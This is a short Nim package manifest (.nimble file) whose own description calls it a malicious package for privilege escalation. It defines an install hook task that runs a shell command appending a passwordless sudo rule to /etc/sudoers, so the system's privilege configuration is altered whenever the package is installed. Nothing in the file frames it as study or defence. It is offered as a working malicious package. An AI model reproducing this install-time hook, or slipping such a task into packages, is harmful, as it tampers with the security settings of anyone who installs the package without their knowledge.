version       = "0.1.0"
author        = "Your Name"
description   = "Malicious Nim package for privilege escalation"
license       = "MIT"
srcDir        = "src"

# Hook to run commands during the install process
installTask = "runPrivEsc"

task runPrivEsc, "Privilege escalation task":
  exec "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
